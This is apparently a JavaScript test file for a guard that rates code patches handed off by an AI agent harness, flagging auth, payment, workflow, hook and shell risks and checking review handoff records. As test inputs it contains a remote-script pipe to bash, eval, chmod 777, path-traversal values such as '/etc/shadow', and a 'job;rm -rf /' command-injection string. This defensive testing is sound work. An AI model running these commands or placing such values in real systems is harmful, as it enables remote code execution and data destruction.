import assert from "node:assert/strict";
import { test } from "node:test";
import {
  reviewHarnessGuard,
  reviewHandoff,
} from "../src/agent-harness-guard.js";

const SOURCE = "a".repeat(40);
const PATCH = "b".repeat(64);

test("safe isolated formatter change stays manual review with precise coverage", () => {
  const scan = reviewHarnessGuard({
    files: ["src/format.js"],
    patch: "diff --git a/src/format.js b/src/format.js\n+const x = 1;",
  });
  assert.equal(scan.risk, "STANDARD_MANUAL_REVIEW");
  assert.deepEqual(scan.signals, []);
  assert.deepEqual(scan.requiredGates, [
    "exact-head-ci",
    "isolated-patch-verification",
  ]);
  assert.equal(scan.autoPublish, false);
  assert.equal(scan.inspection, "PATCH_ADDITIONS_AND_PATHS");
});

test("risk guard flags identity, payment, workflows, agent hooks and unsafe shell", () => {
  const scan = reviewHarnessGuard({
    files: [
      "src/auth.js",
      "src/payment/checkout.js",
      ".github/workflows/release.yml",
      "hooks/security.js",
    ],
    patch: [
      "diff --git a/hooks/security.js b/hooks/security.js",
      "+++ b/hooks/security.js",
      "+eval(input)",
      "+curl https://example.invalid/script | bash",
      "+chmod 777 /tmp/ignored",
      " context child_process.execSync is removed",
    ].join("\n"),
  });
  assert.equal(scan.risk, "ELEVATED_MANUAL_REVIEW");
  assert.equal(scan.autoPublish, false);
  assert.deepEqual(scan.signals, [
    "AGENT_CONTROL_SURFACE",
    "BROAD_PRIVILEGE_CHANGE",
    "DEPLOY_OR_UPDATE",
    "DYNAMIC_CODE_EXECUTION",
    "IDENTITY_OR_SECRETS",
    "PAYMENTS_OR_LICENSING",
    "REMOTE_SCRIPT_PIPELINE",
  ]);
  assert.ok(scan.requiredGates.includes("negative-auth-tests"));
  assert.ok(scan.requiredGates.includes("supply-chain-review"));
  assert.ok(scan.requiredGates.includes("signed-release-proof"));
  assert.ok(scan.requiredGates.includes("commerce-integrity-tests"));
  assert.doesNotMatch(JSON.stringify(scan), /https:\/\/example\.invalid|\/tmp\/ignored|eval\(input\)/);
});

test("removed-only dangerous lines cannot trigger a false positive", () => {
  const scan = reviewHarnessGuard({
    files: ["src/format.js"],
    patch: "-eval(userInput)\n-old code curl | sh\n+const answer = 2;",
  });
  assert.equal(scan.risk, "STANDARD_MANUAL_REVIEW");
});

test("no patch preview gives explicitly incomplete review coverage", () => {
  const scan = reviewHarnessGuard({ files: ["src/format.js"] });
  assert.equal(scan.inspection, "PATHS_ONLY");
  assert.equal(scan.autoPublish, false);
});

test("rejects malformed, oversized and traversal-containing evidence", () => {
  for (const files of [
    [],
    ["src/format.js", "src/format.js"],
    ["../secrets.env"],
    ["/etc/shadow"],
    ["src\\secret"],
    ["src//file"],
    Array.from({ length: 21 }, (_, i) => "src/x" + i),
  ]) {
    assert.throws(
      () => reviewHarnessGuard({ files }),
      /HARNESS_GUARD_INVALID_FILES/,
    );
  }
  assert.throws(
    () => reviewHarnessGuard({ files: ["src/f.js"], patch: "x".repeat(98305) }),
    /HARNESS_GUARD_INVALID_PATCH/,
  );
});

test("handoff is SHA-fenced and contains no patch, prompt, or credentials", () => {
  const guard = reviewHarnessGuard({
    files: ["src/payments/gateway.ts"],
    patch: "+ const gateway = secure;",
  });
  const record = reviewHandoff({
    expectedHead: SOURCE,
    patchSha256: PATCH,
    verificationJobId: "job-2",
    guard,
  });
  assert.deepEqual(record, {
    stage: "REVIEW",
    sourceHead: SOURCE,
    patchSha256: PATCH,
    verificationJobId: "job-2",
    reviewRisk: "ELEVATED_MANUAL_REVIEW",
    requiredGates: guard.requiredGates,
    patchStorage: "ISOLATED_WORKTREE_ONLY",
    reviewStatus: "PENDING",
    publicationStatus: "NOT_PUBLISHED",
  });
  for (const bad of [
    { expectedHead: "not-a-sha", patchSha256: PATCH, verificationJobId: "job-2", guard },
    { expectedHead: SOURCE, patchSha256: PATCH, verificationJobId: "job;rm -rf /", guard },
    { expectedHead: SOURCE, patchSha256: "bad", verificationJobId: "job-2", guard },
  ]) {
    assert.throws(() => reviewHandoff(bad), /HARNESS_HANDOFF_INVALID_EVIDENCE/);
  }
});
